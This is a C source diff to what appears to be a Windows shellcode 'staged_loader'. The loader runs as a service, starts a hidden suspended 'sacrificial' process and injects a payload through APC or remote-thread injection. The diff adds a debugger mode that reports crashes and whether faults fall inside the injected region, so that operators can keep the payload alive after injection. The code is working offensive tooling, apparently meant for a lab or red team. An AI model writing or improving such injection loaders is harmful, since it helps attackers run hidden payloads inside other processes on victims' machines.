@@ -72,12 +72,25 @@
 #define INJECT_VERIFY_MS 5000
 #endif
 
+/* When set, the sacrificial process is created as a debuggee and the loader
+ * doubles as its debugger: the first exception (code, fault address, access
+ * type) and the exit code are reported before the child is let go. This is
+ * how an early crash in a short-lived sacrificial is caught when it cannot be
+ * attached to in time. build.sh enables it with --debug-child. */
+#ifndef INJECT_DEBUG_CHILD
+#define INJECT_DEBUG_CHILD 0
+#endif
+
 static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"staged_loader" */
 #ifndef STAGED_LOADER_NO_SERVICE
 static SERVICE_STATUS_HANDLE g_svc_handle = NULL;
 #endif
 static HANDLE g_stop_event = NULL; /* signaled by the control handler       */
 static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */
+#if INJECT_DEBUG_CHILD
+static void *g_inject_base = NULL; /* remote region holding trampoline+blob */
+static SIZE_T g_inject_size = 0;
+#endif
 
 /* ------------------------------------------------------------------ utils */
 
@@ -348,14 +361,119 @@ static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
   si.wShowWindow = SW_HIDE;
   memset(pi, 0, sizeof(*pi));
 
-  if (!CreateProcessW(sac_path, cmdline, NULL, NULL, FALSE, CREATE_SUSPENDED,
-                      NULL, NULL, &si, pi)) {
-    LOG(L"CreateProcessW(%s) failed: %lu", sac_path, GetLastError());
-    return GetLastError();
+  {
+    DWORD flags = CREATE_SUSPENDED;
+#if INJECT_DEBUG_CHILD
+    flags |= DEBUG_ONLY_THIS_PROCESS;
+#endif
+    if (!CreateProcessW(sac_path, cmdline, NULL, NULL, FALSE, flags, NULL, NULL,
+                        &si, pi)) {
+      LOG(L"CreateProcessW(%s) failed: %lu", sac_path, GetLastError());
+      return GetLastError();
+    }
   }
   g_child = pi->hProcess; /* control handler can kill it on stop */
   return NO_ERROR;
 }
+
+#if INJECT_DEBUG_CHILD
+/*
+ * debug_child_watch pumps the child's debug events. The sacrificial was
+ * created with DEBUG_ONLY_THIS_PROCESS, so the loader is its debugger: every
+ * first-chance exception is visible here even though the child is a separate,
+ * short-lived process we cannot attach to from outside. The exception is
+ * passed through (DBG_EXCEPTION_NOT_HANDLED) so the child's own VEH/SEH still
+ * runs; if nothing handles it the process dies and the exit code is reported.
+ *
+ * Returns NO_ERROR if the child survives the verify window.
+ */
+static DWORD debug_child_watch(PROCESS_INFORMATION *pi) {
+  DWORD start = GetTickCount();
+  DWORD err = NO_ERROR;
+
+  /* The stop event is only wired into the polling watcher; a debug build is a
+   * lab probe, so just keep the symbol referenced. */
+  (void)g_stop_event;
+
+  for (;;) {
+    DEBUG_EVENT de;
+    DWORD cont = DBG_CONTINUE;
+
+    if (GetTickCount() - start >= INJECT_VERIFY_MS) {
+      LOG(L"payload running in process %lu", pi->dwProcessId);
+      break;
+    }
+    if (WaitForDebugEvent(&de, 100) == 0) {
+      continue; /* timeout: keep polling until the window closes */
+    }
+
+    switch (de.dwDebugEventCode) {
+    case CREATE_PROCESS_DEBUG_EVENT:
+      if (de.u.CreateProcessInfo.hFile != NULL) {
+        CloseHandle(de.u.CreateProcessInfo.hFile);
+      }
+      break;
+    case LOAD_DLL_DEBUG_EVENT:
+      if (de.u.LoadDll.hFile != NULL) {
+        CloseHandle(de.u.LoadDll.hFile);
+      }
+      break;
+    case EXCEPTION_DEBUG_EVENT: {
+      EXCEPTION_RECORD *er = &de.u.Exception.ExceptionRecord;
+      const wchar_t *kind = L"-";
+
+      if (er->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
+          er->NumberParameters >= 2) {
+        kind = er->ExceptionInformation[0] == 0   ? L"read"
+               : er->ExceptionInformation[0] == 1 ? L"write"
+                                                  : L"execute";
+      }
+      wprint(L"[loader] child %lu exception %08lx at %p (%s)"
+             L" first_chance=%d\n",
+             pi->dwProcessId, er->ExceptionCode, (void *)er->ExceptionAddress,
+             kind, de.u.Exception.dwFirstChance);
+      if (er->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
+          er->NumberParameters >= 2) {
+        wprint(L"[loader]   %s of address %p\n", kind,
+               (void *)er->ExceptionInformation[1]);
+        if (g_inject_base != NULL) {
+          const wchar_t *loc =
+              ((uintptr_t)er->ExceptionAddress >= (uintptr_t)g_inject_base &&
+               (uintptr_t)er->ExceptionAddress <
+                   (uintptr_t)g_inject_base + g_inject_size)
+                  ? L"inside"
+                  : L"outside";
+          wprint(L"[loader]   fault is %s the injected region [%p..%p)\n", loc,
+                 g_inject_base,
+                 (void *)((uintptr_t)g_inject_base + g_inject_size));
+        }
+      }
+      /* Let the child's own handlers deal with it, exactly as it would
+       * without a debugger. */
+      cont = DBG_EXCEPTION_NOT_HANDLED;
+      break;
+    }
+    case EXIT_PROCESS_DEBUG_EVENT:
+      LOG(L"process %lu exited (code %lu) right after resume; the payload "
+          L"did not survive startup",
+          pi->dwProcessId, de.u.ExitProcess.dwExitCode);
+      err = ERROR_PROCESS_ABORTED;
+      break;
+    default:
+      break;
+    }
+
+    ContinueDebugEvent(de.dwProcessId, de.dwThreadId, cont);
+    if (err != NO_ERROR) {
+      break;
+    }
+  }
+
+  g_child = NULL;
+  CloseHandle(pi->hProcess);
+  return err;
+}
+#endif /* INJECT_DEBUG_CHILD */
 
 /*
  * verify_child watches the freshly resumed child for INJECT_VERIFY_MS: an
@@ -364,6 +482,9 @@ static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
  * have closed (or NULLed) pi->hThread before calling.
  */
 static DWORD verify_child(PROCESS_INFORMATION *pi) {
+#if INJECT_DEBUG_CHILD
+  return debug_child_watch(pi);
+#else
   DWORD i;
   DWORD err = NO_ERROR;
 
@@ -402,6 +523,7 @@ static DWORD verify_child(PROCESS_INFORMATION *pi) {
   }
   LOG(L"payload running in process %lu", pi->dwProcessId);
   return NO_ERROR;
+#endif
 }
 
 static void kill_child_cleanup(PROCESS_INFORMATION *pi) {
@@ -468,6 +590,10 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
   }
 
   blob_addr = base + blob_off;
+#if INJECT_DEBUG_CHILD
+  g_inject_base = base;
+  g_inject_size = total;
+#endif
   if (!inj_write(pi.hProcess, blob_addr, payload, payload_len)) {
     err = GetLastError();
     LOG(L"payload write failed: %lu", err);
@@ -530,6 +656,10 @@ static DWORD do_inject_ct(const unsigned char *payload, size_t payload_len) {
     LOG(L"region allocation failed: %lu", err);
     return inject_fail(&pi, base, err);
   }
+#if INJECT_DEBUG_CHILD
+  g_inject_base = base;
+  g_inject_size = payload_len;
+#endif
   if (!inj_write(pi.hProcess, base, payload, payload_len)) {
     err = GetLastError();
     LOG(L"payload write failed: %lu", err);
